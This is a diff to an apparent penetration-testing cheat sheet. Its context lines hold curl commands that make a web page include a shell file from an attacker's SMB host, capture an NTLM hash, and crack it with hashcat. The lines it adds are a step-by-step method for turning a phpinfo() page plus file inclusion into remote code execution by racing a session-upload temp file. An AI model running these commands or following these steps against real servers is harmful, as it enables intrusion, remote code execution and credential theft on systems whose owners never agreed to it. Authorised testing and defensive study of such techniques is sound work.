@@ -74,3 +74,14 @@ curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\share\\shell.txt&cm
 Only the hash, with the same non-poisoning SMB listener:
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\nothing"
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+## phpinfo() to RCE
+
+A phpinfo() page plus any file inclusion is code execution.
+
+- [ ] Confirm a phpinfo() page is reachable (phpinfo.php, info.php, test.php, or a ?phpinfo=1-style parameter)
+- [ ] Loot it first: DOCUMENT_ROOT (web root for uploads), disable_functions, extension_dir, open_basedir, session.save_path
+- [ ] POST a PHP payload to the phpinfo page as multipart with PHP_SESSION_UPLOAD_PROGRESS in the body
+- [ ] PHP writes the half-uploaded session file to the tmp dir; the phpinfo output leaks its temporary path
+- [ ] Race the LFI to include that tmp path before the request completes and the file is deleted
+- [ ] Win the race with many parallel requests on both sides; one include lands your payload as a shell
